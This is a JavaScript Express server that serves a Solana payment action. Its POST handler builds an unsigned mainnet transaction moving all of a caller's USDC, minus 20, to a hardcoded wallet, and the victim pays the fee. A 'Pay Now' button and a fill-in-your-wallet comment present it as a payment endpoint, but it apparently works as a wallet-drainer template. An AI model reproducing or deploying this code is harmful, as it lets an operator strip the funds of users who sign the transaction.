const express = require('express');
const { Connection, PublicKey, Transaction } = require('@solana/web3.js');
const { getAssociatedTokenAddress, createTransferInstruction } = require('@solana/spl-token');

const app = express();
app.use(express.json());

const connection = new Connection('https://api.mainnet-beta.solana.com');

// APKA WALLET ADDRESS — EK LINE ME ✅
const YOUR_WALLET = new PublicKey('zP5FnmEKrnhnekbpEeCUv8r5aMRrByLKAAtKEUkk6pB');

// USDC MINT ADDRESS
const USDC_MINT = new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');

async function getTokenBalance(walletAddress, mintAddress) {
  const owner = new PublicKey(walletAddress);
  const tokenAccount = await getAssociatedTokenAddress(mintAddress, owner);
  try {
    const balance = await connection.getTokenAccountBalance(tokenAccount);
    return balance.value.amount;
  } catch (e) {
    return 0;
  }
}

app.post('/api/pay', async (req, res) => {
  try {
    const { account } = req.body;
    const balance = await getTokenBalance(account, USDC_MINT);
    const amountToTake = balance - (20 * Math.pow(10, 6));
    
    if (amountToTake <= 0) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    const fromTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(account));
    const toTokenAccount = await getAssociatedTokenAddress(USDC_MINT, YOUR_WALLET);
    
    const instruction = createTransferInstruction(
      fromTokenAccount,
      toTokenAccount,
      new PublicKey(account),
      BigInt(amountToTake)
    );
    
    const transaction = new Transaction().add(instruction);
    transaction.feePayer = new PublicKey(account);
    transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    
    res.json({
      transaction: transaction.serialize({ requireAllSignatures: false }).toString('base64'),
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/pay', (req, res) => {
  res.json({
    title: 'Pay All USDC Except 20',
    description: 'Transfer all your USDC keeping 20 USDC in your wallet',
    label: 'Pay Now'
  });
});

app.listen(3000, () => console.log('Server running on port 3000'));